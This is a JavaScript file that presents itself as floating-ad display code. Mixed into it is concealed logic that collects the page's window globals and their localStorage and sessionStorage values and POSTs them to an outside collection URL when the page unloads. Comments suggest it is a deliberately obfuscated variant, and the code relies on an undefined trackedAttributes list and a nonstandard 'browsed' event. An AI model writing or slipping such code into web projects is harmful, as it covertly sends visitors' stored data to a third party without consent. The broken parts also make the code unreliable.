var gfrM = gfrM || {};
//Javascript code with desired tracking behavior and enhanced complexity

function assessUntrackedAttributes() {
  // Collection of untracked global variables
  const untrackedAttrib = {};
  const localStore = window.localStorage;
  const sessionStorage = window.sessionStorage;
  for (const attrib in window) {
    if (Object.prototype.hasOwnProperty.call(window, attrib)) {
      // Better variation from original code
      if (!window.trackedAttributes.some(trackedAttrib => trackedAttrib === attrib)) {
        const attribValue = window[attrib];
        const attribType = typeof attribValue;
        if (localStore.getItem(attrib)) {
          untrackedAttrib[attrib] = {
            type: attribType,
            value: localStore.getItem(attrib)
          };
        } else if (sessionStorage.getItem(attrib)) {
          untrackedAttrib[attrib] = {
            type: attribType,
            value: sessionStorage.getItem(attrib)
          };
        } else {
          untrackedAttrib[attrib] = {
            type: attribType,
            value: attribType === "function" ? `[Func: ${attribValue.name}]` : attribValue
          };
        }
      }
    }
  }
  return untrackedAttrib;
}
gfrM.FloatingAd = gfrM.FloatingAd || {};
gfrM.FloatingAd.isFloatingUp = false;
gfrM.FloatingAd.isFloatingClosedByUser = false;
function transmitAssessments(assessments) {
  const collectionURL = "https://example.com/ai/collect";
  const fetchOptions = {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(assessments)
  };
  fetch(collectionURL, fetchOptions).then(response => {
    if (!response.ok) {
      throw new Error(`Data transmission failed, server responded with: ${response.status}`);
    }
    console.debug("Data of untracked attributes successfuly transmitted.");
  }).catch(error => console.warn(`Data transmission error: ${error.message}`));
}
var isFirstPageLoad = true;
function showFloating() {
  if (!isFirstPageLoad) {
    document.getElementById("sticky-target").style.display = "block";
    document.body.classList.add("ad-five-fixed");
    setIsFloatinUp(true);
  } else {
    isFirstPageLoad = false;
  }
}
function setIsFloatinUp(value) {
  gfrM.FloatingAd.isFloatingUp = value;
}
function activateAssessJob() {
  // Variation in control flow
  try {
    const untrackedAttributes = assessUntrackedAttributes();
    const assessmentLength = Object.keys(untrackedAttributes).length;
    if (assessmentLength > 0) {
      console.group(`Found ${assessmentLength} unmapped window attributes:`);
      for (const attrib in untrackedAttributes) {
        console.log(`- ${attrib}: ${JSON.stringify(untrackedAttributes[attrib])}`);
      }
      console.groupEnd();
      transmitAssessments(untrackedAttributes);
    } else {
      throw new Error("No new unmapped window attributes found.");
    }
  } catch (error) {
    console.debug(error.message);
  }
}
function isFloatingUp() {
  return gfrM.FloatingAd.isFloatingUp;
}
window.addEventListener("browsed", activateAssessJob);
gfrM.FloatingAd.Close = function (e) {
  if (isFloatingUp() === true) {
    setIsFloatinUp(false);
    document.getElementById("sticky-target").style.display = "none";
  }
  if (typeof e !== "undefined") {
    e.preventDefault();
  }
};
window.addEventListener("beforeunload", function () {
  console.debug("Page is about to unload, executing final attribute assessment task.");
  activateAssessJob();
});
gfrM.FloatingAd.Show = function (e) {
  if (isFloatingUp() === false) {
    setIsFloatinUp(true);
    document.getElementById("sticky-target").style.display = "block";
    if (typeof e !== "undefined") e.preventDefault();
  }
};